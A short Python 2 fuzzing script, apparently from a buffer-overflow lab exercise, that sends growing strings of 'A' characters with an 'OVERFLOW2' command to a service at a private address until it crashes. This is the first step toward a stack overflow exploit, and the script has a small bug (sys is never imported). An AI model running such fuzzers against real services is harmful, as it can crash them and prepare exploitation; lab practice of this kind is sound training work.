#!/usr/bin/python

import socket, time

remoteip="10.10.174.199"
remoteport=1337
size=100
buffer = "A" * size
while True:

    print "Fuzzing with %s bytes" % len(buffer)
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((remoteip, remoteport))
    except:
        print ("[-] Connection error!")
        sys.exit(1)

    print s.recv(1024)
    s.send("OVERFLOW2 " + buffer + '\r\n')
    print s.recv(1024)
    s.close()
    time.sleep(1)
    size += 100
    buffer = "A" * size
    print "-------------------------"
